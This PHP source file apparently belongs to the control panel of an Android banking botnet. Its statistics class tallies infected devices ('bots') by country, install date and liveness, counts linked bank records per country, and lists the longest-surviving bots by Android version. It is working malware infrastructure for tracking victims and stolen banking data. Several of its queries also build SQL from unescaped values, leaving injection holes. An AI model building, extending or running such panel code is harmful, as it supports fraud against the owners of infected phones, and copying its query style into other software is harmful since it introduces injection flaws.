<?php

class Stats
{
	private $db;
	static private $LAST_SEEN_HOURS = 12; // after it bot treats as DEAD
	
	public function connect()
	{
		$this->db = new Db();
		$this->db->connect();
		return $this->db->is_connected;
	}
	
	public function show()
	{
		$header = file_get_contents('tpls/header.html');
		$footer  = file_get_contents('tpls/footer.html');
		$page = file_get_contents('tpls/stats.html');
		
		$tag = "";
		$where_tag = "";
		$and_tag = "";
		$tag_text = "";
		if(isset($_GET['tag']) && preg_match("/^[a-zA-Z_0-9]{2,12}$/", trim($_GET['tag']), $res))
		{
			$tag = trim($_GET['tag']);
			$where_tag = "WHERE tag=" . $this->db->escape($tag);
			$and_tag = "AND tag=" . $this->db->escape($tag);
			$tag_text = ", by tag '{$tag}'";
		}else{
			$msg = <<<PHP
			<div class='row'>
			<div class='col-md-4'></div>
			<div class='col-md-4'>
			<div class="panel panel-default">
				<div class="panel-heading">
					<h3 class="panel-title">Statistics</h3>
				</div>
				<div class="panel-body" style='text-align: center'>
					No statistic collected yet
				</div>
			</div>
			</div><div class='col-md-4'></div>
			</div>
PHP;
			return $header.$msg.$footer;
		}



		$bot_countries = "";
		$sql = "select country, registered, last_seen from bots {$where_tag}";
		
		$res = $this->db->fetch($sql, true);
		$countries = array();
		if(sizeof($res))
		{
			$tmp_stats = array();
			foreach($res as $r)
			{
				if(!array_key_exists($r['country'], $tmp_stats))
				{
					$tmp_stats[$r['country']] = array(
						'total'=>0, 
						'alive'=>0, 
						'offline'=>0, 
						'dead'=>0,
						'installed_today'=>0,
					);
				}
				
				$tmp_stats[$r['country']]['total']++;
				
				if(time() - date_create($r['registered'])->getTimestamp() < 60*60*24)
				{
					$tmp_stats[$r['country']]['installed_today']++;
				}
				
				$ts = date_create($r['last_seen'])->getTimestamp();
				$passed = time()-$ts;
				
				if($passed < 60*5) # 60*Bots::ALIVE_HOURS
				{
					$tmp_stats[$r['country']]['alive']++;
				}
				else if($passed < 60*60*Stats::$LAST_SEEN_HOURS)
				{
					$tmp_stats[$r['country']]['offline']++;
				}
				else
				{
					$tmp_stats[$r['country']]['dead']++;
				}
			}
		
		foreach($tmp_stats as $country=>$info)
		{
			$flag_path = "get.php?f=rc/flags/". strtoupper($country) . ".png";
			$bot_countries .= "<tr>
				<td>
					<img src='{$flag_path}' alt='{$country}'  title='{$country}' />
				</td>
				<td>{$info['total']}</td>
				<td>{$info['installed_today']}</td>
				<td>{$info['alive']}</td>
				<td>{$info['offline']}</td>
				<td>{$info['dead']}</td>
			</tr>\n";
			$countries[] = $r['country'];
		}
		
		}
	
		$bot_banks = "";
		
		$countries = array_unique($countries);
		sort($countries);
		if(!sizeof($countries))
		{
			$h = <<<PHP
			<div class='row'>
			<div class='col-md-4'></div>
			<div class='col-md-4'>
			<div class="panel panel-default">
				<div class="panel-heading">
					<h3 class="panel-title">Statistics{$tag_text}</h3>
				</div>
				<div class="panel-body" style='text-align: center'>
					No statistic collected yet
				</div>
			</div>
			</div><div class='col-md-4'></div>
			</div>
PHP;
			return $header.$h.$footer;
		}
		
		$countries[] = "";
		
		foreach($countries as $c)
		{
			$sql = "select bot_id from bots where country='{$c}' {$and_tag}";
			$res = $this->db->fetch($sql, true);
			if(!sizeof($res)) continue;
			
			$bids = "";
			foreach($res as $r)
				$bids .= "'{$r['bot_id']}',";

			$bids = substr($bids, 0, strlen($bids)-1);
			$sql = "select count(id) from banks where bot_id in({$bids})";
			$res = $this->db->fetch($sql, true);
			
			$num = $res[0]['count(id)'];
			$c_str = ($c != "")? $c : "-";
			if($num != "" && $num != 0)
				$bot_banks .= "<tr><td>{$c_str}</td> <td>{$num}</td></tr>\n";
		}
		
		$bot_lifetime = "";
		$sql = "select bot_id, android, datediff(last_seen,registered) as tdf, timediff(last_seen,registered) as df from bots {$where_tag} order by df desc limit 10";
		$res = $this->db->fetch($sql, true);
		if(sizeof($res))
		{
			foreach($res as $r)
			{
				//~ print_r($res);
				//~ Array ( [bot_id] => 18596f00f39c844d08e57655b5a29634 [android] => 7.0 [df] => 00:26:36 ) 
				
				//~ $bot_link = "<a href='?a=admin&action=bots&bbot_id={$r['bot_id']}&page=bot_page'>Bot&nbsp;page</a>";
				//~ <tr><td>{$bot_link}</td>
				$android = $r['android'];
				$time = $r['df'];
				if($r['tdf'] > 0)
					$time = $r['df'] . " ({$r['tdf']} days) ";
					
				$bot_lifetime .= "
				<td>{$android}</td>\n
				<td>{$time}</td></tr>\n";
			}
		}
		
		//~ $sql = "select tag from bots group by tag";
		//~ $res = $this->db->fetch($sql, true);
		//~ $bot_tag = $this->getTagStats($res);
		
		$page = str_replace('%BOT_STATS_COUNTRY%', $bot_countries, $page);
		//$page = str_replace('%BOT_STATS_BANKS%', $bot_banks, $page);
		$page = str_replace('%BOT_STATS_LIFETIME%', $bot_lifetime, $page);
		//~ $page = str_replace('%BOT_STATS_TAG%', $bot_tag, $page);
		
		$page = str_replace('%STATS_FOLDER%', PANEL_FOLDER, $page);
		$page = str_replace('%TAG_TEXT%', $tag_text, $page);

		return $header.$page.$footer;
	}

	public function getTagStats($rows)
	{
		if(!sizeof($rows)) return "";
		
		$tags = [];
		foreach($rows as $r) $tags[] = $r['tag'];
		
		$html = "";
		
		foreach($tags as $tag)
		{
			$html .= $this->getStatsForTag($tag, true);
		}
		
		return $html;
	}
	
	public function getStatsForTag($tag, $showTagName)
	{
		$sql = "SELECT count(id), country FROM `bots` WHERE tag='{$tag}' group by country;";
		$res = $this->db->fetch($sql, true);
		
		if(sizeof($res))
		{
			$country = '<table class="table table-bordered">';
			
			$country .= "<tr>";
			foreach($res as $r)
			{
				$c = (trim($r['country']) != "")? $r['country'] : "''";
				$country .= "<td>{$c}</td>";
			}
			$country .= "</tr>";
			
			$country .= "<tr>";
			foreach($res as $r)
			{
				$country .= "<td>{$r['count(id)']}</td>";
			}
			$country .= "</tr>";
			
			$country .= '</table>';
			
		}else{
			$country = "no info";
		}
		
		if($showTagName)
		{
			return "<tr>
		<td>{$tag}</td>
		<td>{$country}</td>
		</tr>";
		}else{
			return "<tr>
		<td colspan='2'>{$country}</td>
		</tr>";
		}
	}
	
}
